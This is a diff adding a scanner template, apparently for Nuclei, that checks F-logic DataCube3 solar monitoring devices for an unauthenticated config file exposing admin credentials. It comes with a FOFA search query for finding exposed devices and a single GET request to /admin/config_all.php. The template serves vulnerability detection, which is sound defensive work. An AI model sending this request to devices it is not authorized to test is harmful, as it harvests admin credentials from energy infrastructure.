@@ -1,0 +1,28 @@
+id: flogic-datacube3-info-leak
+
+info:
+  name: "F logic DataCube3 config_all.php 配置文件信息泄露"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: title=="DataCube3"
+          F-logic DataCube3 是专为光伏发电系统设计的终端测量设备，具备数据采集与监控功能。该设备存在配置文件访问控制缺陷，攻击者可绕过身份验证机制获取敏感配置信息。
+  tags: F-logic DataCube3
+
+http:
+- raw:
+  - |
+    GET /admin/config_all.php HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [302]
+  - type: word
+    part: body
+    words:
+    - 'login.admin_id'
+  - type: word
+    part: body
+    words:
+    - 'login.admin_pwd'
